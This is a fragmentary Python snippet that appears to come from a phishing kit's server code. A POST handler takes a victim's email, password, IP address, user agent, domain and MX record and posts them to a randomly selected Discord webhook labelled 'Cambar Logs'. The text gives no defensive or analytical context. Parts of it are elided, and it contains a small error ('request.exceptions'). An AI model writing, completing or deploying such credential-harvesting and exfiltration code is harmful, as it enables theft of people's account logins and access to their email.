...
def send_discord_messagea(email, password, ip, useragent, domain, mx_record):
    webhook_urla = random.choice(DISCORD_WEBHOOK_URLSA)  # Select a random webhook
    message = {
        "username": "Cambar Logs",
        "embeds": [
            {
    ...
    try:
        requests.post(webhook_urla, json=message)
    except request.exceptions.RequestException as e:
        print(f"Error sending message to Discord: {e}")
...
def first():
    if request.method == 'POST':
        ...
        send_discord_messagea(email, password, ip, useragent, domain, mx_record)
